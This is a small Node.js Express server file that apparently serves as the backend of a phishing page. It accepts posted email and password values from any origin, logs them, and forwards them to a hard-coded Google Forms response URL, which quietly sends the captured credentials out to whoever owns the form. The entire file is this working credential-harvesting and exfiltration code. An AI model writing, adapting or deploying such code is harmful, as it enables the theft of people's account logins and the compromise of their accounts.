const express = require("express");
const cors = require("cors");
const FormData = require("form-data");

const app = express();

app.use(cors());
app.use(express.json());

const infor = {
  email:'entry.234410775',
  password: 'entry.647855806'
}

app.post("/", (req, res) => {
  const { email, password } = req.body;
  console.log(email, password)
  const url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeKGYGlTkFUWD24GMRC4bzxZXyy08kpePKw4MLKqmjxRoBDaQ/formResponse";
  const formData = new FormData();
  formData.append(infor.email, email);
  formData.append(infor.password, password);
  formData.submit(url);
  res.send("ok")
});

app.listen(3000);
